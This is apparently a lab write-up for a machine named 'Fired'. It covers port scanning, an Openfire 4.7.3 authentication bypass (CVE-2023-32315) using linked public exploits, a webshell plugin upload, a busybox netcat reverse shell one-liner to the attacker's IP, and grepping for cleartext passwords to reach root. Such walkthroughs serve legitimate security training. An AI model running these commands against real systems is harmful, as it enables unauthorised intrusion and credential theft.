# Fired

So i start my enumeration by scanning for open ports ->

```
nmap -p- 192.168.52.96 --vv
nmap -sCV 192.168.52.96 > nmap.out
```

and i discover the following services:

```
PORT     STATE SERVICE        REASON
22/tcp   open  ssh            syn-ack ttl 63
9090/tcp open  zeus-admin     syn-ack ttl 63
9091/tcp open  xmltec-xmlmail syn-ack ttl 63
```

On the first service i see an admin console:

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>Openfire, Version: 4.7.3</p></figcaption></figure>

And the version seems vulnerable to this exploit:

{% embed url="https://github.com/K3ysTr0K3R/CVE-2023-32315-EXPLOIT" %}

So i managed to use the exploit that creates credentials to bypass auth:

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

So i looked around for interesting stuff and found this Plugins tab that seemed shady:

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

And after looking it up i found a webshell plugin that i could try to abuse:

{% embed url="https://github.com/miko550/CVE-2023-32315/blob/main/openfire-management-tool-plugin.jar" %}

I upload the plugin and navigate to the webshell just like in the poc and i can now execute commands:

<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

just before getting my revshell i catch the flag:

<figure><img src="../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

So here i got stuck for few minutes and started to look at all my shell techniques and couldn't get a reverse shell, and found a `which busybox` command that i never used and it worked i got my shell with:

```
busybox nc 192.168.49.52 4444 -e /bin/sh
```

and i looked into why this one works and the others don't and came to the conclusion that `nc` doesn't work because its version **doesn't support the `-e` option** (for security reasons). However, `busybox nc` works because **BusyBox includes a version of Netcat that still allows `-e`** to execute a shell.

I popped a low interactive shell so i quickly upgraded it:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

So i had a hard time on privesc, i tried linpeas, suid and all the usual enumeration, then i tried grepping for passwords with&#x20;

```
grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
```

I didn' t see much but i found many things related to databases which i hate enumerating and i remembered that in the openfire web instance there was an admin user so i thought that maybe the password would be in cleartext somewhere so i looked around and went into `/var/lib` which is a directory in Linux is used to store **variable state information** for system services and applications and stored **Databases** (e.g., `/var/lib/mysql` for MySQL, `/var/lib/postgresql` for PostgreSQL) so maybe my openfire db was there and indeed it was. I grepped for passwords and found a password which made me able to login as root:

<figure><img src="../../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p><span data-gb-custom-inline data-tag="emoji" data-code="1f389">🎉</span></p></figcaption></figure>
